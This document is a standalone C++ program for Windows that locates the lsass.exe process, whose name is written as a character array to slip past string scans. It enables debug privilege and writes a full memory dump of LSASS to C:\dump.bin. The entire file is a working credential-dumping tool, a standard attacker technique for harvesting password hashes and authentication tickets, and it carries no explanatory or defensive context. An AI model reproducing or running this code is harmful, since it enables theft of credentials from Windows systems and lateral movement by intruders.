#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

wchar_t targetProcess[] = { 'l','s','a','s','s','.','e','x','e','\0' };

DWORD FetchProcessID() {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "[!] Snapshot failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &procEntry) == TRUE) {
		do {
			if (_wcsicmp(procEntry.szExeFile, targetProcess) == 0) {
				DWORD targetPID = procEntry.th32ProcessID;
				CloseHandle(hSnapshot);
				return targetPID;
			}
		} while (Process32Next(hSnapshot, &procEntry) == TRUE);
	}
	CloseHandle(hSnapshot);
	return 0;
}

BOOL AdjustPrivilege(LPCWSTR privilege) {

	LUID luid;
	HANDLE hToken;

	if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
		return EXIT_FAILURE;
	}

	TOKEN_PRIVILEGES tokenPrivs = { 0 };
	tokenPrivs.PrivilegeCount = 1;
	tokenPrivs.Privileges[0].Luid = luid;
	tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return EXIT_FAILURE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		return EXIT_FAILURE;
	}

	return TRUE;
}

BOOL CreateMemoryDump() {

	DWORD processID = FetchProcessID();

	HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processID);
	if (hProcess == NULL) {
		return EXIT_FAILURE;
	}

	HANDLE hDumpFile = CreateFileA("C:\\dump.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDumpFile == INVALID_HANDLE_VALUE) {
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	if (!MiniDumpWriteDump(hProcess, processID, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
		return EXIT_FAILURE;
	}

	return TRUE;
}

int main() {

	AdjustPrivilege(SE_DEBUG_NAME);
	CreateMemoryDump();

	return EXIT_SUCCESS;
}